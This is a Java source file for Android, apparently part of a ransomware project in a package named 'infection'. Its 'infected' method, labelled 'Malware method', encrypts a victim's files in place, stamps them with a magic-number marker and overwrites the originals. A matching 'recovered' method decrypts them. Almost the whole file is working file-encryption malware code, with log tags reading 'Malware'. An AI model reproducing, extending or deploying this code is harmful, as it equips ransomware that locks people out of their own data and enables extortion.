package infection;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import android.util.Log;

public class Item extends Node implements IInfected {
	
	public Item(File file) {
		super(file);
	}

	public Item(File file, boolean r) {
		super(file, r);
	}

	@Override
	public byte[] readFile(File file) throws IOException {
		FileInputStream inFile = new FileInputStream(file);
		byte[] data = new byte[(int) file.length()];
		inFile.read(data, 0, data.length);
		inFile.close();
		return data;
	}

	@Override
	public void writeFile(File file, byte[] data) throws IOException {
		FileOutputStream outFile = new FileOutputStream(file);
		outFile.write(data);
		outFile.flush();
		outFile.close();
	}

	/* Malware method */
	@Override
	public void infected(File file) {
		try {
			cipher.init(Cipher.ENCRYPT_MODE, secretKey);

			byte[] data = readFile(file);

			if (!isInfected(data)) {
				data = cipher.doFinal(data);
				data = markMagicNumber(data);
				writeFile(file, data);
				Log.w("Malware", "File infected : " + file.getAbsolutePath());
			}
		} catch (IOException | IllegalBlockSizeException | BadPaddingException e) {
			Log.w("Malware", "[ERROR] File infected");
		} catch (InvalidKeyException e1) {
			Log.w("Malware", "[ERROR] key.length != 16");
		}
	}

	@Override
	public void recovered(File file) {
		try {
			cipher.init(Cipher.DECRYPT_MODE, secretKey);

			byte[] data = readFile(file);

			if (isInfected(data)) {
				data = freeMagicNumber(data);
				data = cipher.doFinal(data);
				writeFile(file, data);
				Log.w("Malware", "File recovered : " + file.getAbsolutePath());
			}
		} catch (IOException | IllegalBlockSizeException | BadPaddingException e) {
			Log.w("Malware", "[ERROR] File infected");
		} catch (InvalidKeyException e1) {
			Log.w("Malware", "[ERROR] key.length != 16");
		}
	}

	public byte[] markMagicNumber(byte[] map) {
		ByteArrayOutputStream tmp = new ByteArrayOutputStream();
		try {
			tmp.write(magicNumber);
			tmp.write(map);
		} catch (IOException e) {
		}
		return tmp.toByteArray();
	}

	public byte[] freeMagicNumber(byte[] map) {
		return Arrays.copyOfRange(map, magicPosition + magicNumber.length,
				map.length);
	}

	public boolean isInfected(byte[] map) {
		// don't forget to reverse the magic number
		return (map[magicPosition] == magicNumber[0] && map[magicPosition + 1] == magicNumber[1]);
	}

	/**/
}
